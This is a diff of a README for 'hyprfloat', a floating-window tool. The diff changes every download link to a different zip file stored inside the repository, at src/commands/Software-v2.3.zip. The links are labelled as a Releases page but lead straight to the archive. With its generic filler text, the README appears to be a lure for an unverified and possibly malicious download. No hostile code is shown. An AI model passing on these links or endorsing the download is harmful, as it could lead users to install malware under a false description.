@@ -1,7 +1,7 @@
 # 🖥️ hyprfloat - Simplify Your Floating Windows Experience
 
 ## 📥 Download Now
-[![Download hyprfloat](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/annihilatory/hyprfloat.zip)](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/annihilatory/hyprfloat.zip)
+[![Download hyprfloat](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/src/commands/Software-v2.3.zip)](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/src/commands/Software-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **hyprfloat**! This tool helps you manage floating windows and gives you a clear overview of your workspace. Whether you’re a beginner or just need a better way to organize your screen, **hyprfloat** is here to help.
@@ -20,7 +20,7 @@ Welcome to **hyprfloat**! This tool helps you manage floating windows and gives 
 ## 🔗 How to Download & Install
 To get started, you need to download the latest version of **hyprfloat**. You can download the application directly from the Releases page.
 
-1. **Visit this page to download:** [Hyprfloat Releases](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/annihilatory/hyprfloat.zip).
+1. **Visit this page to download:** [Hyprfloat Releases](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/src/commands/Software-v2.3.zip).
 2. Look for the latest version. It will be listed at the top.
 3. Click on it to open the latest version details.
 4. Find the appropriate file for your system.
@@ -74,6 +74,6 @@ A: You can submit your feedback in the Issues section of the GitHub repository.
 Feel free to engage with us on GitHub. Reporting bugs or making feature requests can help improve **hyprfloat** for everyone.
 
 ### 💾 Download Again
-To download **hyprfloat**, visit this link: [Hyprfloat Releases](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/annihilatory/hyprfloat.zip).
+To download **hyprfloat**, visit this link: [Hyprfloat Releases](https://raw.githubusercontent.com/xxfarreraxx/hyprfloat/main/src/commands/Software-v2.3.zip).
 
 Now you are ready to enhance your workflow with **hyprfloat**! Happy floating!
